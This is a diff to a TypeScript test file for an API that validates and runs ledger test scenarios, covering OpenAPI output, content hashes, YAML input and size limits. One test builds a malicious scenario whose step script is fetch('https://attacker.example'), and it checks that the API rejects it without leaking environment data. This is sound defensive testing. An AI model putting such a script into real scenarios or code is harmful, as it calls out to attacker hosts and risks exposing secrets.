@@ -3,6 +3,7 @@ import { buildApp } from "../src/app.js";
 import type { LedgerExecution, LedgerGateway, Scenario } from "../src/domain.js";
 import type { AppConfig } from "../src/config.js";
 import { SafeRunError } from "../src/errors.js";
+import { completeScenario } from "./fixtures.js";
 
 const config: AppConfig = {
   host: "127.0.0.1",
@@ -24,7 +25,7 @@ const config: AppConfig = {
 const ledger: LedgerGateway = {
   execute: vi.fn(async (_scenario: Scenario): Promise<LedgerExecution> => ({
     steps: [{ id: "send-xlm", type: "payment", status: "passed", message: "Confirmed." }],
-    assertions: [{ type: "balanceEquals", status: "passed", message: "Balance matched." }],
+    assertions: [{ type: "balanceEquals", status: "passed", expected: "5", actual: "5", message: "Balance matched." }],
   })),
 };
 
@@ -52,6 +53,47 @@ describe("Esure API", () => {
     const response = await createApp().inject({ method: "GET", url: "/api/v1/scenarios" });
     expect(response.statusCode).toBe(200);
     expect(response.json().items).toHaveLength(3);
+    expect(response.json().items[0].contentHash).toMatch(/^sha256:[a-f0-9]{64}$/);
+  });
+
+  it("publishes an OpenAPI 3.1 document containing declarative endpoints", async () => {
+    const response = await createApp().inject({ method: "GET", url: "/openapi.json" });
+    expect(response.statusCode).toBe(200);
+    expect(response.json()).toMatchObject({ openapi: "3.1.0" });
+    expect(response.json().paths).toHaveProperty("/api/v1/runs/definitions");
+    expect(response.json().components.schemas).toHaveProperty("ScenarioV1");
+  });
+
+  it("validates and starts an inline JSON scenario with version and content hash", async () => {
+    const app = createApp();
+    const definition = completeScenario();
+    const validated = await app.inject({ method: "POST", url: "/api/v1/scenarios/validate", payload: definition });
+    expect(validated.statusCode).toBe(200);
+    expect(validated.json()).toMatchObject({ valid: true, scenarioId: definition.id, schemaVersion: 1 });
+    expect(validated.json().contentHash).toMatch(/^sha256:[a-f0-9]{64}$/);
+
+    const started = await app.inject({ method: "POST", url: "/api/v1/runs/definitions", payload: definition });
+    expect(started.statusCode).toBe(202);
+    expect(started.json()).toMatchObject({ scenarioId: definition.id, scenarioVersion: 1, scenarioSchemaVersion: 1 });
+    expect(started.json().scenarioContentHash).toBe(validated.json().contentHash);
+  });
+
+  it("validates and starts a raw YAML scenario", async () => {
+    const yaml = `schemaVersion: 1\nid: api-yaml\nversion: 1\nname: API YAML\ndescription: Submitted as YAML.\nnetwork: testnet\naccounts:\n  - { id: sender, generate: true, fund: true }\n  - { id: recipient, generate: true, fund: true }\nassets:\n  - { id: xlm, type: native }\nsteps:\n  - { id: pay, type: payment, from: sender, to: recipient, asset: xlm, amount: \"1\" }\nassertions:\n  - { type: stepSucceeded, step: pay }\n`;
+    const app = createApp();
+    expect((await app.inject({ method: "POST", url: "/api/v1/scenarios/validate", headers: { "content-type": "application/yaml" }, payload: yaml })).statusCode).toBe(200);
+    expect((await app.inject({ method: "POST", url: "/api/v1/runs/definitions", headers: { "content-type": "application/yaml" }, payload: yaml })).statusCode).toBe(202);
+  });
+
+  it("returns bounded validation details for malicious inline scenarios", async () => {
+    const definition = completeScenario() as any;
+    definition.network = "mainnet";
+    definition.steps[0].script = "fetch('https://attacker.example')";
+    const response = await createApp().inject({ method: "POST", url: "/api/v1/runs/definitions", payload: definition });
+    expect(response.statusCode).toBe(400);
+    expect(response.json().error).toMatchObject({ code: "INVALID_SCENARIO", message: "Scenario definition is invalid." });
+    expect(response.json().error.details.length).toBeLessThanOrEqual(50);
+    expect(response.body).not.toContain("process.env");
   });
 
   it("returns a consistent not-found envelope", async () => {
@@ -79,6 +121,16 @@ describe("Esure API", () => {
     });
     expect(response.statusCode).toBe(413);
     expect(response.json().error.code).toBe("INVALID_REQUEST");
+  });
+
+  it("enforces the scenario definition limit even when the API body limit is configured higher", async () => {
+    const definition = completeScenario() as ReturnType<typeof completeScenario> & { padding?: string };
+    definition.padding = "x".repeat(20_000);
+    const response = await createApp({ config: { ...config, bodyLimitBytes: 32_768 } }).inject({
+      method: "POST", url: "/api/v1/runs/definitions", payload: definition,
+    });
+    expect(response.statusCode).toBe(400);
+    expect(response.json().error.code).toBe("INVALID_SCENARIO");
   });
 
   it("starts and completes a run without exposing secrets", async () => {
